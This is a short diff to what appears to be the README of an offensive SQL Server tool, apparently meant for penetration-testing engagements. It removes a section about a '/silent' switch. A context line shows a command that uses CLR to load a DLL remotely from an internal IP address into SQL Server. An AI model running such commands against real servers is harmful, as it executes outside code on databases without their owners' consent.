@@ -226,11 +226,6 @@ Or even use Common Language Runtime (CLR) to load remotely a library with:
 /a:clr \"http://172.16.118.218/d/SqlLibrary.dll\"
 ```
 
-## Options and Features ⚙️
-
-### Too Much Output?
-Use the `/silent` switch for a streamlined experience. It minimizes output, showing only the action results, making it particularly useful for some engagements where less is more.
-
 ## Project Structure 📚
 This project follows several key software development principles and practices.
 
